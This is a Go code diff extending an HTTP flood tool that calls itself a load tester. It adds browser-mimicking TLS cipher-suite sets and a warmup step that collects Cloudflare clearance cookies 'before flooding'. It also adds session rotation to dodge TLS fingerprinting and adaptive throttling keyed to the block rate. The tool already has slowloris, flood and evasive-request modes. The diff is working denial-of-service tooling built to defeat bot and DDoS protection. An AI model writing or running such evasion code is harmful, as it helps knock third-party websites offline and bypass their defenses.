@@ -10,6 +10,7 @@ import (
 	"math/rand"
 	"net"
 	"net/http"
+	"net/http/cookiejar"
 	"net/url"
 	"os"
 	"strconv"
@@ -70,7 +71,52 @@ var referers = []string{
 	"https://t.co/redirect",
 	"https://www.reddit.com/",
 	"https://www.linkedin.com/",
-	"", "", "",
+	"https://news.ycombinator.com/",
+	"https://www.youtube.com/",
+	"", "", "", "",
+}
+
+// TLS fingerprint variations — different cipher suites mimic different browsers
+var tlsConfigs = []*tls.Config{
+	{ // Chrome-like
+		MinVersion: tls.VersionTLS12,
+		MaxVersion: tls.VersionTLS13,
+		CipherSuites: []uint16{
+			tls.TLS_AES_128_GCM_SHA256,
+			tls.TLS_AES_256_GCM_SHA384,
+			tls.TLS_CHACHA20_POLY1305_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+		},
+	},
+	{ // Firefox-like
+		MinVersion: tls.VersionTLS12,
+		MaxVersion: tls.VersionTLS13,
+		CipherSuites: []uint16{
+			tls.TLS_AES_128_GCM_SHA256,
+			tls.TLS_CHACHA20_POLY1305_SHA256,
+			tls.TLS_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
+		},
+	},
+	{ // Safari-like
+		MinVersion: tls.VersionTLS12,
+		MaxVersion: tls.VersionTLS13,
+		CipherSuites: []uint16{
+			tls.TLS_AES_128_GCM_SHA256,
+			tls.TLS_AES_256_GCM_SHA384,
+			tls.TLS_CHACHA20_POLY1305_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+		},
+	},
 }
 
 var encodings = []string{
@@ -109,6 +155,66 @@ type TestConfig struct {
 	Timeout            time.Duration
 	Mode               string
 	Paths              []string
+}
+
+// --- Adaptive rate controller ---
+// Monitors block rate and automatically adjusts throughput
+
+type AdaptiveController struct {
+	throttleFactor int64 // 0 = full speed, 1-5 = increasingly throttled
+	lastBlockRate  float64
+}
+
+func (a *AdaptiveController) GetDelay() time.Duration {
+	f := atomic.LoadInt64(&a.throttleFactor)
+	if f <= 0 {
+		return 0
+	}
+	// Exponential backoff: 5ms, 15ms, 40ms, 80ms, 150ms
+	delays := []time.Duration{5, 15, 40, 80, 150}
+	idx := int(f) - 1
+	if idx >= len(delays) {
+		idx = len(delays) - 1
+	}
+	base := delays[idx] * time.Millisecond
+	jitter := time.Duration(rand.Intn(int(base/2) + 1))
+	return base + jitter
+}
+
+func (a *AdaptiveController) Update(metrics *Metrics) {
+	total := atomic.LoadInt64(&metrics.TotalRequests)
+	blocked := atomic.LoadInt64(&metrics.BlockedRequests)
+	if total < 100 {
+		return
+	}
+	blockRate := float64(blocked) / float64(total) * 100
+
+	var newFactor int64
+	switch {
+	case blockRate > 60:
+		newFactor = 5
+	case blockRate > 40:
+		newFactor = 4
+	case blockRate > 25:
+		newFactor = 3
+	case blockRate > 15:
+		newFactor = 2
+	case blockRate > 8:
+		newFactor = 1
+	default:
+		newFactor = 0
+	}
+
+	old := atomic.LoadInt64(&a.throttleFactor)
+	if newFactor != old {
+		atomic.StoreInt64(&a.throttleFactor, newFactor)
+		if newFactor > old {
+			color.Yellow("  [adaptive] Block rate %.0f%% -> throttling (level %d)", blockRate, newFactor)
+		} else {
+			color.Green("  [adaptive] Block rate %.0f%% -> easing (level %d)", blockRate, newFactor)
+		}
+	}
+	a.lastBlockRate = blockRate
 }
 
 // --- Metrics ---
@@ -384,6 +490,64 @@ func generateDynamicPayload(seq int) string {
 	return string(data)
 }
 
+// --- Session builder (cookie jar + varied TLS) ---
+
+func buildClient(config *TestConfig, workerID int) *http.Client {
+	jar, _ := cookiejar.New(nil)
+
+	// Pick a TLS config variant based on worker ID for fingerprint diversity
+	baseTLS := tlsConfigs[workerID%len(tlsConfigs)]
+	tlsCfg := baseTLS.Clone()
+	tlsCfg.InsecureSkipVerify = config.InsecureSkipVerify
+
+	transport := &http.Transport{
+		DialContext: (&net.Dialer{
+			Timeout:   10 * time.Second,
+			KeepAlive: 30 * time.Second,
+		}).DialContext,
+		TLSClientConfig:       tlsCfg,
+		TLSHandshakeTimeout:   10 * time.Second,
+		ResponseHeaderTimeout: 15 * time.Second,
+		MaxIdleConns:          5,
+		MaxIdleConnsPerHost:   5,
+		MaxConnsPerHost:       5,
+		IdleConnTimeout:       90 * time.Second,
+		DisableCompression:    false, // real browsers accept compression
+		DisableKeepAlives:     false,
+		ForceAttemptHTTP2:     true, // real browsers use H2
+		WriteBufferSize:       4096,
+		ReadBufferSize:        4096,
+	}
+
+	return &http.Client{
+		Timeout:   config.Timeout,
+		Transport: transport,
+		Jar:       jar, // accept & resend Cloudflare cookies (__cf_bm, cf_clearance)
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			if len(via) >= 3 {
+				return http.ErrUseLastResponse
+			}
+			return nil
+		},
+	}
+}
+
+// warmupSession does a slow initial request to collect CF cookies before flooding.
+func warmupSession(client *http.Client, config *TestConfig) {
+	req, err := buildEvasiveRequest("GET", config.URL, nil, true)
+	if err != nil {
+		return
+	}
+	resp, err := client.Do(req)
+	if err != nil {
+		return
+	}
+	io.Copy(io.Discard, resp.Body)
+	resp.Body.Close()
+	// small human-like delay after page load
+	time.Sleep(time.Duration(200+rand.Intn(500)) * time.Millisecond)
+}
+
 // --- Request execution ---
 
 // isRetryable returns true for transient TCP errors worth retrying.
@@ -441,7 +605,6 @@ func makeRequest(client *http.Client, config *TestConfig, sequence int) RequestR
 		}
 	}
 
-	// unreachable, but satisfies the compiler
 	return RequestResult{Error: fmt.Errorf("max retries exceeded")}
 }
 
@@ -523,10 +686,16 @@ func slowlorisWorker(id int, config *TestConfig, metrics *Metrics, wg *sync.Wait
 // --- Standard worker ---
 
 func worker(id int, config *TestConfig, metrics *Metrics, wg *sync.WaitGroup,
-	ctx context.Context, rateLimiter *rate.Limiter, requestCounter *int64, client *http.Client) {
+	ctx context.Context, rateLimiter *rate.Limiter, requestCounter *int64, client *http.Client,
+	adaptive *AdaptiveController) {
 	defer wg.Done()
 
+	// Warmup: collect Cloudflare cookies before hitting hard
+	warmupSession(client, config)
+
 	sequence := 0
+	// Periodically rotate to a fresh session to avoid long-lived TLS fingerprinting
+	sessionLifetime := 500 + rand.Intn(500) // rotate every 500-1000 requests
 
 	for {
 		select {
@@ -546,8 +715,19 @@ func worker(id int, config *TestConfig, metrics *Metrics, wg *sync.WaitGroup,
 				}
 			}
 
+			// Adaptive throttle: slow down if getting blocked
+			if adaptive != nil {
+				if d := adaptive.GetDelay(); d > 0 {
+					time.Sleep(d)
+				}
+			}
+
 			if config.Mode == ModeStealth {
-				jitter := time.Duration(rand.Intn(50)) * time.Millisecond
+				// Realistic human browsing jitter: 20-200ms with occasional longer pauses
+				jitter := time.Duration(20+rand.Intn(180)) * time.Millisecond
+				if rand.Intn(20) == 0 {
+					jitter += time.Duration(500+rand.Intn(2000)) * time.Millisecond
+				}
 				time.Sleep(jitter)
 			}
 
@@ -555,8 +735,11 @@ func worker(id int, config *TestConfig, metrics *Metrics, wg *sync.WaitGroup,
 			result := makeRequest(client, config, sequence)
 			metrics.Update(result)
 
-			if id < 3 && sequence%1000 == 0 {
-				color.Magenta("  Worker %d: %d requests sent", id, sequence)
+			// Session rotation: fresh TLS + cookies
+			if sequence%sessionLifetime == 0 {
+				client = buildClient(config, id+rand.Intn(100))
+				warmupSession(client, config)
+				sessionLifetime = 500 + rand.Intn(500)
 			}
 		}
 	}
@@ -609,36 +792,23 @@ func startLoadTest(config *TestConfig) {
 			rateLimiter = rate.NewLimiter(rate.Limit(config.RequestsPerSecond), burst)
 		}
 
-		transport := &http.Transport{
-			DialContext: (&net.Dialer{
-				Timeout:   10 * time.Second,
-				KeepAlive: 30 * time.Second,
-			}).DialContext,
-			TLSClientConfig: &tls.Config{
-				InsecureSkipVerify: config.InsecureSkipVerify,
-			},
-			TLSHandshakeTimeout:   10 * time.Second,
-			ResponseHeaderTimeout: 15 * time.Second,
-			MaxIdleConns:          config.ConcurrentWorkers + 10,
-			MaxIdleConnsPerHost:   config.ConcurrentWorkers + 10,
-			MaxConnsPerHost:       config.ConcurrentWorkers + 10,
-			IdleConnTimeout:       90 * time.Second,
-			DisableCompression:    true,
-			DisableKeepAlives:     false,
-			ForceAttemptHTTP2:     false,
-			WriteBufferSize:       4096,
-			ReadBufferSize:        4096,
-		}
-		client := &http.Client{
-			Timeout:   config.Timeout,
-			Transport: transport,
-			CheckRedirect: func(req *http.Request, via []*http.Request) error {
-				if len(via) >= 3 {
-					return http.ErrUseLastResponse
+		adaptive := &AdaptiveController{}
+
+		// Launch adaptive monitor
+		go func() {
+			ticker := time.NewTicker(3 * time.Second)
+			defer ticker.Stop()
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				case <-ticker.C:
+					adaptive.Update(metrics)
 				}
-				return nil
-			},
-		}
+			}
+		}()
+
+		color.Cyan("  Warming up sessions...")
 
 		if config.Mode == ModeRamp {
 			initialWorkers := config.ConcurrentWorkers / 10
@@ -647,8 +817,9 @@ func startLoadTest(config *TestConfig) {
 			}
 
 			for i := 0; i < initialWorkers; i++ {
+				client := buildClient(config, i)
 				wg.Add(1)
-				go worker(i, config, metrics, &wg, ctx, rateLimiter, &requestCounter, client)
+				go worker(i, config, metrics, &wg, ctx, rateLimiter, &requestCounter, client, adaptive)
 			}
 
 			go func() {
@@ -668,8 +839,9 @@ func startLoadTest(config *TestConfig) {
 							toAdd = config.ConcurrentWorkers - launched
 						}
 						for i := 0; i < toAdd; i++ {
+							client := buildClient(config, launched+i)
 							wg.Add(1)
-							go worker(launched+i, config, metrics, &wg, ctx, rateLimiter, &requestCounter, client)
+							go worker(launched+i, config, metrics, &wg, ctx, rateLimiter, &requestCounter, client, adaptive)
 						}
 						launched += toAdd
 						color.Yellow("  -> Ramped to %d/%d workers", launched, config.ConcurrentWorkers)
@@ -678,8 +850,9 @@ func startLoadTest(config *TestConfig) {
 			}()
 		} else {
 			for i := 0; i < config.ConcurrentWorkers; i++ {
+				client := buildClient(config, i)
 				wg.Add(1)
-				go worker(i, config, metrics, &wg, ctx, rateLimiter, &requestCounter, client)
+				go worker(i, config, metrics, &wg, ctx, rateLimiter, &requestCounter, client, adaptive)
 			}
 		}
 	}
@@ -749,8 +922,15 @@ func main() {
 		Mode:               ModeFlood,
 		Paths: []string{
 			"/",
+			"/",
+			"/",
 			"/favicon.ico",
 			"/robots.txt",
+			"/sitemap.xml",
+			"/api",
+			"/api/v1",
+			"/health",
+			"/status",
 			"/.well-known/security.txt",
 		},
 	}
